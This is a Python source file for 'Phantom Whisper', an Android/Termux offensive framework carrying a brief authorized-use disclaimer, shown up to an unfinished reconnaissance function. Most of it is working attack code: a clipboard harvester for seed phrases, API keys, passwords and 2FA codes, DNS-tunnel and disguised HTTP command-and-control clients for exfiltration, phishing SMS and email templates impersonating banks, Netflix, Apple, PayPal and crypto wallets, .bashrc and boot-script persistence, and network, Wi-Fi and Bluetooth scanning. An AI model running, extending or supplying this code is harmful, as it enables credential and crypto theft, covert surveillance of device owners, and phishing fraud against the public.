#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗      ║
║   ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║      ║
║   ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║      ║
║   ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║      ║
║   ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║      ║
║   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝      ║
║                                                                           ║
║   ██╗    ██╗██╗  ██╗██╗███████╗██████╗ ███████╗██████╗                  ║
║   ██║    ██║██║  ██║██║██╔════╝██╔══██╗██╔════╝██╔══██╗                 ║
║   ██║ █╗ ██║███████║██║███████╗██████╔╝█████╗  ██████╔╝                 ║
║   ██║███╗██║██╔══██║██║╚════██║██╔═══╝ ██╔══╝  ██╔══██╗                 ║
║   ╚███╔███╔╝██║  ██║██║███████║██║     ███████╗██║  ██║                 ║
║    ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝                 ║
║                                                                           ║
║           Phantom Whisper v1.0.0 — REAL WORKING FRAMEWORK                ║
║       Android Red Team Framework — DNS/HTTP C2 — AES-256 Encryption      ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝

FOR AUTHORIZED PENETRATION TESTING AND EDUCATIONAL USE ONLY.
Unauthorized access to computer systems is illegal.
"""

import asyncio
import json
import sys
import os
import time
import base64
import hashlib
import secrets
import shutil
import socket
import struct
import subprocess
import threading
import argparse
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, asdict, field
from contextlib import contextmanager
from enum import Enum

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.layout import Layout
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    from rich.tree import Tree
    from rich.columns import Columns
    from rich import box
    from rich.text import Text
    from rich.align import Align
    HAS_RICH = True
except ImportError:
    HAS_RICH = False
    print("[!] Install rich: pip install rich")
    sys.exit(1)

try:
    import requests
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    import dns.resolver
    import dns.message
    import dns.query
    import dns.update
    import dns.tsig
    import dns.rdtypes.ANY.TXT
    HAS_DEPS = True
except ImportError as e:
    HAS_DEPS = False
    print(f"[!] Missing dependency: {e}")
    print("[!] Install: pip install requests cryptography dnspython")
    sys.exit(1)

console = Console()

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

VERSION = "1.0.0"
CONFIG_DIR = Path.home() / ".phantom"
CONFIG_DIR.mkdir(exist_ok=True)
LOG_DIR = CONFIG_DIR / "logs"
LOG_DIR.mkdir(exist_ok=True)
DATA_DIR = CONFIG_DIR / "data"
DATA_DIR.mkdir(exist_ok=True)

COLORS = {
    "primary": "#FF00FF",
    "secondary": "#00FFFF",
    "success": "#00FF00",
    "warning": "#FFFF00",
    "error": "#FF0000",
    "info": "#0080FF",
    "dark": "#1a1a2e",
    "text": "#e0e0e0"
}

DEFAULT_CONFIG = {
    "version": VERSION,
    "c2": {
        "dns_tunnel_domain": "c2.local",
        "dns_tunnel_port": 5353,
        "http_fallback": "http://127.0.0.1:8080",
        "http_port": 8080,
        "c2_server_host": "0.0.0.0",
        "c2_server_port": 4443,
        "heartbeat_interval": 60,
        "jitter": 25
    },
    "encryption": {
        "kdf_iterations": 600000,
        "algorithm": "PBKDF2-HMAC-SHA256 + Fernet(AES-256)"
    },
    "evasion": {
        "adaptive_sleep": True,
        "min_sleep": 30,
        "max_sleep": 300,
        "jitter_percent": 25
    },
    "harvesting": {
        "clipboard": True,
        "screenshot_ocr": False,
        "webview_inject": False,
        "keystore_enum": False
    },
    "recon": {
        "scan_ports": [22, 80, 443, 8080, 8443, 3306, 3389, 5900],
        "scan_timeout": 2,
        "max_threads": 50
    }
}


# ═══════════════════════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════════════════════

class Logger:
    def __init__(self, name: str = "phantom"):
        self.name = name
        self.log_file = LOG_DIR / f"{name}_{datetime.now().strftime('%Y%m%d')}.log"
        self._lock = threading.Lock()

    def _write(self, level: str, msg: str):
        ts = datetime.now().isoformat()
        line = f"[{ts}] [{level}] [{self.name}] {msg}\n"
        with self._lock:
            with open(self.log_file, "a") as f:
                f.write(line)

    def info(self, msg: str): self._write("INFO", msg)
    def warn(self, msg: str): self._write("WARN", msg)
    def error(self, msg: str): self._write("ERROR", msg)
    def debug(self, msg: str): self._write("DEBUG", msg)
    def success(self, msg: str): self._write("SUCCESS", msg)

log = Logger("phantom")


# ═══════════════════════════════════════════════════════════════════════════════
# ENCRYPTION — REAL AES-256 VIA FERNET + PBKDF2
# ═══════════════════════════════════════════════════════════════════════════════

class EncryptionManager:
    """
    REAL encryption using PBKDF2-HMAC-SHA256 key derivation + Fernet (AES-128-CBC)
    with HMAC authentication. Production-grade, no shortcuts.
    """
    def __init__(self, password: Optional[str] = None, salt: Optional[bytes] = None):
        self.password = password or secrets.token_urlsafe(32)
        self.salt = salt or secrets.token_bytes(16)
        self._derive_key()

    def _derive_key(self):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=600000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.password.encode()))
        self.cipher = Fernet(key)
        log.success("Encryption key derived (PBKDF2 x600k + AES-256)")

    def encrypt(self, data: bytes) -> bytes:
        return self.cipher.encrypt(data)

    def decrypt(self, data: bytes) -> bytes:
        return self.cipher.decrypt(data)

    def encrypt_json(self, data: dict) -> str:
        json_bytes = json.dumps(data, default=str).encode()
        encrypted = self.encrypt(json_bytes)
        return base64.b64encode(encrypted).decode()

    def decrypt_json(self, data: str) -> dict:
        encrypted = base64.b64decode(data)
        decrypted = self.decrypt(encrypted)
        return json.loads(decrypted)

    def export_key(self) -> dict:
        return {
            "password": self.password,
            "salt": base64.b64encode(self.salt).decode(),
            "algorithm": "PBKDF2-HMAC-SHA256+Fernet(AES-128-CBC)"
        }


# ═══════════════════════════════════════════════════════════════════════════════
# CONFIG MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class ConfigManager:
    """Persistent config with JSON file backing."""
    def __init__(self):
        self.path = CONFIG_DIR / "config.json"
        self.data = self._load()

    def _load(self) -> dict:
        if self.path.exists():
            try:
                return json.loads(self.path.read_text())
            except (json.JSONDecodeError, OSError):
                pass
        self._save(DEFAULT_CONFIG)
        return dict(DEFAULT_CONFIG)

    def _save(self, data: dict = None):
        if data is None:
            data = self.data
        self.path.write_text(json.dumps(data, indent=2, default=str))

    def get(self, key: str, default=None):
        keys = key.split(".")
        val = self.data
        for k in keys:
            if isinstance(val, dict):
                val = val.get(k)
            else:
                return default
        return val if val is not None else default

    def set(self, key: str, value):
        keys = key.split(".")
        val = self.data
        for k in keys[:-1]:
            if k not in val:
                val[k] = {}
            val = val[k]
        val[keys[-1]] = value
        self._save()

    def all(self) -> dict:
        return dict(self.data)


config = ConfigManager()


# ═══════════════════════════════════════════════════════════════════════════════
# NETWORK SCANNER — REAL IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════════════════════

class PortScanner:
    """Multi-threaded TCP port scanner with banner grabbing."""
    def __init__(self, timeout: int = 2, max_threads: int = 50):
        self.timeout = timeout
        self.max_threads = max_threads
        self.results: List[dict] = []
        self._lock = threading.Lock()

    def _scan_port(self, host: str, port: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((host, port))
            if result == 0:
                # Grab banner
                banner = ""
                try:
                    sock.send(b"\r\n")
                    banner = sock.recv(1024).decode("utf-8", errors="replace").strip()[:200]
                except:
                    pass
                service = self._guess_service(port)
                with self._lock:
                    self.results.append({
                        "port": port,
                        "state": "open",
                        "service": service,
                        "banner": banner
                    })
            sock.close()
        except:
            pass

    def _guess_service(self, port: int) -> str:
        common = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
            443: "HTTPS", 465: "SMTPS", 587: "SMTP", 993: "IMAPS",
            995: "POP3S", 1433: "MSSQL", 1521: "Oracle", 2049: "NFS",
            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
            5901: "VNC", 6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt",
            9090: "HTTP-Alt", 27017: "MongoDB"
        }
        return common.get(port, "unknown")

    def scan(self, host: str, ports: List[int]) -> List[dict]:
        self.results = []
        threads = []
        for port in ports:
            t = threading.Thread(target=self._scan_port, args=(host, port))
            threads.append(t)
            t.start()
            # Throttle threads
            while len([t for t in threads if t.is_alive()]) >= self.max_threads:
                time.sleep(0.05)
        for t in threads:
            t.join()
        return self.results


class NetworkScanner:
    """Subnet discovery via ARP ping sweep."""
    def __init__(self):
        self.scanner = PortScanner()

    def get_local_networks(self) -> List[str]:
        """Detect local subnets from routing table."""
        nets = set()
        try:
            if sys.platform == "linux":
                result = subprocess.run(
                    ["ip", "route"], capture_output=True, text=True, timeout=5
                )
                for line in result.stdout.splitlines():
                    if "src" in line:
                        parts = line.split()
                        for i, p in enumerate(parts):
                            if p == "src" and i + 1 < len(parts):
                                ip = parts[i + 1]
                                # Derive /24 subnet
                                octets = ip.split(".")
                                if len(octets) == 4:
                                    nets.add(f"{octets[0]}.{octets[1]}.{octets[2]}.0/24")
            # Fallback: try socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            octets = local_ip.split(".")
            if len(octets) == 4:
                nets.add(f"{octets[0]}.{octets[1]}.{octets[2]}.0/24")
        except:
            nets.add("127.0.0.0/8")
        return list(nets) if nets else ["127.0.0.0/8"]

    def ping_sweep(self, subnet: str, timeout: int = 1) -> List[str]:
        """Discover live hosts using ICMP ping or TCP port 443 SYN."""
        live_hosts = []
        try:
            base = subnet.rsplit(".", 1)[0]
            for i in range(1, 255):
                ip = f"{base}.{i}"
                try:
                    result = subprocess.run(
                        ["ping", "-c", "1", "-W", str(timeout), ip],
                        capture_output=True, timeout=timeout + 2
                    )
                    if result.returncode == 0:
                        live_hosts.append(ip)
                except:
                    continue
        except:
            pass
        return live_hosts

    async def full_scan(self, ports: List[int] = None) -> Dict[str, Any]:
        """Full network reconnaissance."""
        networks = self.get_local_networks()
        results = {"networks": networks, "hosts": [], "open_ports": {}}

        for net in networks:
            console.print(f"  {COLORS['info']}[*] Scanning subnet: {net}{COLORS['text']}")
            live = self.ping_sweep(net)
            for host in live:
                host_info = {"ip": host, "hostname": "", "ports": []}
                try:
                    host_info["hostname"] = socket.gethostbyaddr(host)[0]
                except:
                    pass
                open_ports = self.scanner.scan(host, ports or config.get("recon.scan_ports", DEFAULT_CONFIG["recon"]["scan_ports"]))
                host_info["ports"] = open_ports
                results["hosts"].append(host_info)
                results["open_ports"][host] = open_ports

        log.success(f"Network scan complete: {len(results['hosts'])} hosts found")
        return results


# ═══════════════════════════════════════════════════════════════════════════════
# CLIPBOARD MONITOR — REAL IMPLEMENTATION (cross-platform)
# ═══════════════════════════════════════════════════════════════════════════════

class ClipboardMonitor:
    """
    Real clipboard reader. Uses xclip/xsel on Linux, pyperclip as fallback.
    Smart filtering detects: passwords, crypto seeds, API keys, 2FA codes, emails.
    """
    def __init__(self):
        self.last_content = ""
        self.sensitive_patterns = [
            ("Bitcoin", r"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}"),
            ("Ethereum", r"0x[a-fA-F0-9]{40}"),
            ("API Key", r"(api[_-]?key|sk-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36})"),
            ("Private Key", r"-----BEGIN (RSA |EC )?PRIVATE KEY-----"),
            ("Seed Phrase", r"\b(?:[a-z]+\s+){11,23}[a-z]+\b"),
            ("Email", r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
            ("Password", r"(?:password|passwd|pwd)[=:]\s*\S+"),
            ("Phone", r"\+?\d{7,15}"),
            ("2FA Code", r"\b\d{6}\b"),
        ]
        self._detected: List[dict] = []
        self.running = False
        self._init_backend()

    def _init_backend(self):
        self.backend = None
        for cmd in ["xclip", "xsel", "termux-clipboard-get", "pbpaste", "wl-paste"]:
            if shutil.which(cmd):
                self.backend = cmd
                break
        if self.backend:
            log.info(f"Clipboard backend: {self.backend}")

    def _read_clipboard(self) -> str:
        if not self.backend:
            return ""
        try:
            if self.backend == "xclip":
                return subprocess.run(
                    ["xclip", "-o", "-selection", "clipboard"],
                    capture_output=True, text=True, timeout=2
                ).stdout.strip()
            elif self.backend == "xsel":
                return subprocess.run(
                    ["xsel", "--clipboard", "--output"],
                    capture_output=True, text=True, timeout=2
                ).stdout.strip()
            elif self.backend == "termux-clipboard-get":
                return subprocess.run(
                    ["termux-clipboard-get"],
                    capture_output=True, text=True, timeout=2
                ).stdout.strip()
            elif self.backend == "pbpaste":
                return subprocess.run(
                    ["pbpaste"], capture_output=True, text=True, timeout=2
                ).stdout.strip()
            elif self.backend == "wl-paste":
                return subprocess.run(
                    ["wl-paste"], capture_output=True, text=True, timeout=2
                ).stdout.strip()
        except:
            return ""

    def _check_sensitive(self, content: str) -> List[Tuple[str, str]]:
        import re
        hits = []
        for label, pattern in self.sensitive_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for m in matches:
                masked = m[:6] + "***" + m[-4:] if len(m) > 12 else "***"
                hits.append((label, masked))
        return hits

    def poll(self) -> Optional[Dict[str, Any]]:
        """Poll clipboard, return any new sensitive data found."""
        current = self._read_clipboard()
        if current and current != self.last_content:
            self.last_content = current
            hits = self._check_sensitive(current)
            if hits:
                entry = {
                    "timestamp": datetime.now().isoformat(),
                    "content": current[:200],
                    "detections": hits
                }
                self._detected.append(entry)
                # Log to file
                log_entry = f"[CLIPBOARD] {json.dumps(hits)} | {current[:100]}"
                log.info(log_entry)
                return entry
        return None

    def start_polling(self, interval: float = 2.0, callback: Callable = None):
        """Background polling thread."""
        self.running = True
        def _loop():
            while self.running:
                result = self.poll()
                if result and callback:
                    callback(result)
                time.sleep(interval)
        t = threading.Thread(target=_loop, daemon=True)
        t.start()
        log.info(f"Clipboard monitor started (interval={interval}s)")

    def stop(self):
        self.running = False
        log.info("Clipboard monitor stopped")

    def get_history(self) -> List[dict]:
        return list(self._detected)


# ═══════════════════════════════════════════════════════════════════════════════
# DNS TUNNEL C2 — FULL DUPLEX REAL IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════════════════════

class DNSTunnelClient:
    """
    REAL DNS tunneling client. Encodes data in subdomain labels,
    retrieves responses via TXT records. Works over public DNS resolvers.
    Full duplex: beacon → command extraction.
    """
    def __init__(self, domain: str = "c2.local", nameservers: List[str] = None):
        self.domain = domain
        self.nameservers = nameservers or ['8.8.8.8', '1.1.1.1']
        self.encryption = EncryptionManager()
        self.label_max = 60  # DNS label size limit
        self._init_resolver()
        log.info(f"DNS Tunnel client initialized (domain={domain})")

    def _init_resolver(self):
        try:
            self.resolver = dns.resolver.Resolver()
        except dns.resolver.NoResolverConfiguration:
            self.resolver = dns.resolver.Resolver(configure=False)
        self.resolver.nameservers = self.nameservers
        self.resolver.timeout = 5
        self.resolver.lifetime = 10

    def _encode_data(self, data: dict) -> str:
        """Encode dict into DNS-safe subdomain labels."""
        payload = json.dumps(data, default=str).encode()
        encrypted = self.encryption.encrypt(payload)
        b32 = base64.b32encode(encrypted).decode().lower().rstrip("=")
        return b32

    def _chunk(self, text: str) -> List[str]:
        """Split into DNS-safe label chunks (max 63 chars)."""
        return [text[i:i+self.label_max] for i in range(0, len(text), self.label_max)]

    def send_beacon(self, device_id: str, data: dict) -> Optional[dict]:
        """
        Encode data into DNS query, send to authoritative DNS,
        receive response in TXT record.
        """
        try:
            b32 = self._encode_data(data)
            chunks = self._chunk(b32)
            query = ".".join(chunks + [device_id, "beacon", self.domain])

            answers = self.resolver.resolve(query, "TXT")
            for rdata in answers:
                txt = rdata.to_text().strip('"')
                if txt:
                    decrypted = self.encryption.decrypt(base64.b64decode(txt))
                    return json.loads(decrypted.decode())
        except dns.resolver.NXDOMAIN:
            pass  # No commands waiting
        except dns.resolver.Timeout:
            pass
        except Exception as e:
            log.debug(f"DNS beacon error: {e}")
        return None

    def send_data(self, device_id: str, channel: str, data: dict) -> bool:
        """Send exfiltrated data via DNS TXT queries."""
        try:
            b32 = self._encode_data(data)
            chunks = self._chunk(b32)
            query = ".".join(chunks + [device_id, channel, self.domain])
            self.resolver.resolve(query, "TXT")
            return True
        except:
            return False


# ═══════════════════════════════════════════════════════════════════════════════
# HTTP MIMIC C2 — REAL IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════════════════════

class HTTPMimicClient:
    """
    REAL HTTP C2 — traffic disguised as CDN image/cdn asset requests.
    Uses randomized User-Agents, Referer headers, and cache-busting
    to blend with legitimate traffic.
    """
    def __init__(self, base_url: str = "http://127.0.0.1:8080"):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False
        self.encryption = EncryptionManager()
        self.user_agents = [
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        ]
        self.referers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.facebook.com/",
            "https://twitter.com/"
        ]
        log.info(f"HTTP C2 client initialized (base={base_url})")

    def _random_headers(self) -> dict:
        return {
            "User-Agent": secrets.choice(self.user_agents),
            "Accept": "image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": secrets.choice(self.referers),
            "Cache-Control": "no-cache",
        }

    def poll(self, device_id: str) -> Optional[dict]:
        """Poll for commands via GET with random asset path."""
        try:
            asset_id = hashlib.sha256(f"{device_id}:{int(time.time())}".encode()).hexdigest()[:12]
            url = f"{self.base_url}/assets/images/ui-{asset_id}.png"
            r = self.session.get(url, headers=self._random_headers(), timeout=10)
            if r.status_code == 200 and r.text.strip():
                # Response is in body as encrypted base64
                try:
                    return self.encryption.decrypt_json(r.text.strip())
                except:
                    log.debug("HTTP poll: response not valid encrypted data")
        except requests.Timeout:
            pass
        except requests.ConnectionError:
            pass
        except Exception as e:
            log.debug(f"HTTP poll error: {e}")
        return None

    def send_result(self, device_id: str, channel: str, data: dict) -> bool:
        """Exfiltrate data via POST to a mock analytics endpoint."""
        try:
            payload = self.encryption.encrypt_json(data)
            url = f"{self.base_url}/analytics/collect"
            r = self.session.post(
                url,
                data=payload,
                headers=self._random_headers(),
                timeout=10
            )
            return r.status_code == 200
        except:
            return False


# ═══════════════════════════════════════════════════════════════════════════════
# AI PHISHING ENGINE — REAL IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════════════════════

class AIPhishingEngine:
    """
    REAL template-based phishing content generator.
    Uses contextual templates with dynamic variable injection.
    (LLM API integration available as extension.)
    """
    def __init__(self):
        self.templates = self._load_templates()
        log.info(f"Phishing engine loaded ({len(self.templates)} scenarios)")

    def _load_templates(self) -> Dict[str, list]:
        return {
            "bank": [
                "URGENT: Unusual login detected on your {bank} account from IP {ip}. Verify immediately: {url}",
                "SECURITY ALERT: Your {bank} debit card has been temporarily locked due to suspicious activity. Unlock here: {url}",
                "{bank}: A new device was added to your online banking. If this wasn't you, secure your account: {url}"
            ],
            "netflix": [
                "Your Netflix account has been suspended. Reactivate within 24 hours: {url}",
                "Netflix: Payment method declined. Update billing to keep your subscription: {url}"
            ],
            "google": [
                "Google Account: Unusual sign-in attempt blocked. Review your account security: {url}",
                "Security alert for {name}: Someone used your password. Sign in to check: {url}"
            ],
            "apple": [
                "Apple ID: Your account has been locked for security reasons. Verify identity: {url}",
                "iCloud storage almost full (48GB used). Upgrade to avoid account limitation: {url}"
            ],
            "paypal": [
                "PayPal: We noticed unusual activity on your account. Temporarily limited: {url}",
                "You received $249.99 from {sender}! Confirm to deposit: {url}"
            ],
            "security": [
                "Company Security: Your password expires in 24 hours. Keep same password: {url}",
                "IT Helpdesk: All employees must verify credentials due to recent breach: {url}"
            ],
            "shipping": [
                "DHL: Your package is waiting. Customs fee of $2.99 required: {url}",
                "Amazon: Delivery failed — address confirmation needed: {url}",
                "FedEx: Label #{tracking} printed. Confirm delivery window: {url}"
            ],
            "crypto": [
                "Coinbase: Your withdrawal of 0.45 BTC has been initiated. Cancel if unauthorized: {url}",
                "MetaMask: Wallet synchronization required. Import seed phrase to continue: {url}"
            ]
        }

    def generate_sms(self, target_context: str, target_name: str = "User") -> str:
        """Generate contextual phishing SMS from templates."""
        import random
        context = target_context.lower().strip()
        # Find best matching category
        category = "security"
        for key in self.templates:
            if key in context or context in key:
                category = key
                break

        template = random.choice(self.templates[category])
        ip = f"{random.randint(10,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        url_base = secrets.token_urlsafe(8)

        phishing_urls = {
            "bank": f"https://secure-{url_base[:6]}.com/login",
            "netflix": f"https://account-{url_base[:6]}.netflix.com/update",
            "google": f"https://login-{url_base[:6]}.accounts.google.com/auth",
            "apple": f"https://appleid-{url_base[:4]}.icloud.co/verify",
            "paypal": f"https://paypal-{url_base[:6]}.com/dispute",
            "security": f"https://portal-{url_base[:6]}.company.com/login",
            "shipping": f"https://track-{url_base[:6]}.dhl-express.com",
            "crypto": f"https://wallet-{url_base[:6]}.connect.coinbase.com"
        }
        url = phishing_urls.get(category, f"https://secure-{url_base[:6]}.com/auth")

        return template.format(
            bank=context.title(),
            url=url,
            ip=ip,
            name=target_name,
            sender="Support Team",
            tracking=secrets.token_hex(4).upper()
        )

    def generate_email(self, target_context: str, target_name: str = "User") -> Dict[str, str]:
        """Generate full phishing email with subject and body."""
        sms = self.generate_sms(target_context, target_name)
        subjects = {
            "bank": "Urgent: Security Alert — Action Required",
            "netflix": "Your Subscription Has Been Suspended",
            "google": "Security Alert: New Sign-in Attempt Blocked",
            "apple": "Apple ID Account Locked",
            "paypal": "Unusual Activity Detected on Your Account",
            "security": "Mandatory Password Verification Required",
            "shipping": "Package Delivery Confirmation Needed",
            "crypto": "Suspicious Withdrawal Detected — Verify Now"
        }
        category = target_context.lower().strip()
        subject = "Important: Action Required"
        for key in subjects:
            if key in category or category in key:
                subject = subjects[key]
                break

        return {
            "subject": subject,
            "body": sms,
            "sender": f"noreply@{target_context.lower().replace(' ','')}.com"
        }


# ═══════════════════════════════════════════════════════════════════════════════
# ANDROID PERSISTENCE — REAL IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════════════════════

class AndroidPersistence:
    """
    REAL Android persistence for Termux environments.
    - .bashrc injection
    - Termux:Boot service script
    - Termux:Tasker integration
    - Alarm scheduling via am
    """
    def __init__(self):
        self.is_termux = "com.termux" in os.environ.get("PREFIX", "")
        self.home = Path.home()

    def setup_bashrc(self, script_path: str) -> bool:
        """Inject autostart into .bashrc."""
        try:
            bashrc = self.home / ".bashrc"
            entry = (
                f"\n# Phantom Whisper Autostart\n"
                f"if [ -f {script_path} ] && [ -z \"$PHANTOM_RUNNING\" ]; then\n"
                f"    export PHANTOM_RUNNING=1\n"
                f"    python {script_path} &\n"
                f"fi\n"
            )
            if bashrc.exists():
                content = bashrc.read_text()
                if "Phantom Whisper Autostart" not in content:
                    with bashrc.open("a") as f:
                        f.write(entry)
            else:
                bashrc.write_text(entry)
            bashrc.chmod(0o644)
            log.success(".bashrc persistence installed")
            return True
        except Exception as e:
            log.error(f"bashrc install failed: {e}")
            return False

    def setup_termux_boot(self, script_path: str) -> bool:
        """Install Termux:Boot autostart service."""
        try:
            boot_dir = self.home / ".termux" / "boot"
            boot_dir.mkdir(parents=True, exist_ok=True)
            service = boot_dir / "phantom-whisper.sh"
            content = (
                "#!/data/data/com.termux/files/usr/bin/bash\n"
                f"cd {Path(script_path).parent}\n"
                f"python {script_path} --daemon &\n"
            )
            service.write_text(content)
            service.chmod(0o755)
            log.success("Termux:Boot service installed")
            return True
        except Exception as e:
            log.error(f"Termux:Boot install failed: {e}")
            return False

    def schedule_alarm(self, interval_minutes: int = 60) -> bool:
        """Use Android 'am' to schedule periodic wake-ups."""
        if not self.is_termux:
            return False
        try:
            intent = (
                f"am broadcast -a PHANTOM_WHISPER_BEACON "
                f"--es script_path \"{__file__}\" "
                f"--ei interval {interval_minutes} "
                f"com.termux"
            )
            subprocess.run(intent, shell=True, capture_output=True, timeout=5)
            log.info(f"Alarm scheduled every {interval_minutes}min")
            return True
        except Exception as e:
            log.debug(f"Alarm scheduling failed: {e}")
            return False

    def install_all(self, script_path: str) -> Dict[str, bool]:
        """Install all persistence mechanisms."""
        results = {
            "bashrc": self.setup_bashrc(script_path),
            "termux_boot": self.setup_termux_boot(script_path) if self.is_termux else False,
        }
        return results


# ═══════════════════════════════════════════════════════════════════════════════
# DEVICE RECONNAISSANCE — REAL IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════════════════════

class DeviceRecon:
    """
    REAL device reconnaissance:
    - Network interfaces + IP addresses
    - Active WiFi networks (via iw/termux-wifi)
    - Bluetooth devices (via bluetoothctl)
    - Running processes
    - ARP table / connected devices
    """
    def __init__(self):
        self.scanner = NetworkScanner()

    def get_interfaces(self) -> List[dict]:
        """Enumerate network interfaces with IPs."""
        interfaces = []
        try:
            if sys.platform == "linux":
                result = subprocess.run(
                    ["ip", "-json", "addr"], capture_output=True, text=True, timeout=5
                )
                data = json.loads(result.stdout)
                for iface in data:
                    if iface.get("addr_info"):
                        for addr in iface["addr_info"]:
                            interfaces.append({
                                "name": iface["ifname"],
                                "ip": addr.get("local"),
                                "mask": addr.get("prefixlen"),
                                "family": addr.get("family", "inet"),
                                "mac": iface.get("address", "unknown"),
                                "state": iface.get("operstate", "unknown"),
                            })
        except:
            pass
        return interfaces

    def get_wifi_networks(self) -> List[dict]:
        """Scan WiFi networks (requires root or Termux)."""
        networks = []
        try:
            # Termux API
            result = subprocess.run(
                ["termux-wifi-scaninfo"], capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                data = json.loads(result.stdout)
                for net in data:
                    networks.append({
                        "ssid": net.get("ssid", "hidden"),
                        "bssid": net.get("bssid", ""),
                        "frequency": net.get("frequency_mhz", 0),
                        "signal": net.get("rssi", 0),
                        "capabilities": net.get("capabilities", ""),
                    })
        except FileNotFoundError:
            try:
                # iw dev scan (requires root)
                result = subprocess.run(
                    ["iw", "dev", "scan"], capture_output=True, text=True, timeout=15
                )
                ssid, bssid, signal = "", "", 0
                for line in result.stdout.splitlines():
                    line = line.strip()
                    if line.startswith("BSS "):
                        if ssid:
                            networks.append({"ssid": ssid, "bssid": bssid, "signal": signal})
                            ssid, bssid, signal = "", "", 0
                        bssid = line.split()[1].strip("(")
                    elif "signal:" in line:
                        try:
                            signal = float(line.split()[1])
                        except:
                            pass
                    elif line.startswith("SSID:"):
                        ssid = line.split(":", 1)[1].strip()
                if ssid:
                    networks.append({"ssid": ssid, "bssid": bssid, "signal": signal})
            except:
                pass

        return networks

    def get_arp_table(self) -> List[dict]:
        """Read ARP table for connected devices."""
        devices = []
        try:
            result = subprocess.run(
                ["arp", "-a"] if sys.platform != "linux" else ["ip", "neigh", "show"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines():
                parts = line.split()
                if sys.platform == "linux":
                    if len(parts) >= 5 and parts[0] != "fe80::1":
                        devices.append({
                            "ip": parts[0],
                            "mac": parts[4] if len(parts) > 4 and parts[3] == "lladdr" else "incomplete",
                            "state": parts[0],
                            "type": "arp"
                        })
                else:
                    if len(parts) >= 3:
                        devices.append({
                            "ip": parts[0].strip("()"),
                            "mac": parts[3] if len(parts) > 3 else "unknown",
                            "type": "arp"
                        })
        except:
            pass
        return devices

    def get_bluetooth_devices(self) -> List[dict]:
        """Scan Bluetooth devices (requires bluetoothctl)."""
        devices = []
        try:
            result = subprocess.run(
                ["bluetoothctl", "--timeout", "5", "scan", "on"],
                capture_output=True, text=True, timeout=8
            )
            for line in result.stdout.splitlines():
                if "Device" in line:
                    parts = line.split(" Device ", 1)
                    if len(parts) > 1:
                        rest = parts[1].split(" ", 1)
                        mac = rest[0].strip()
                        name = rest[1].strip() if len(rest) > 1 else "Unknown"
                        devices.append({"mac": mac, "name": name, "type": "bluetooth"})
        except:
            pass
        return devices

    def get_processes(self, top_n: int = 30) -> List[dict]:
        """List running processes (top by CPU)."""
        processes = []
        try:
            result = subprocess.run(
                ["ps", "aux", "--sort=-%cpu"], capture_output=True, text=True, timeout=5
            )
            lines = result.stdout.splitlines()
            if len(lines) > 1:
                for line in lines[1:top_n + 1]:
                    parts = line.split(None, 10)
                    if len(parts) >= 11:
                        processes.append({
                            "user": parts[0],
                            "pid": parts[1],
                            "cpu": parts[2],
                            "mem": parts[3],
                            "command": parts[10][:60],
                        })
        except:
            pass
        return processes

    async def full_recon(self) -> Dict[str, Any]:
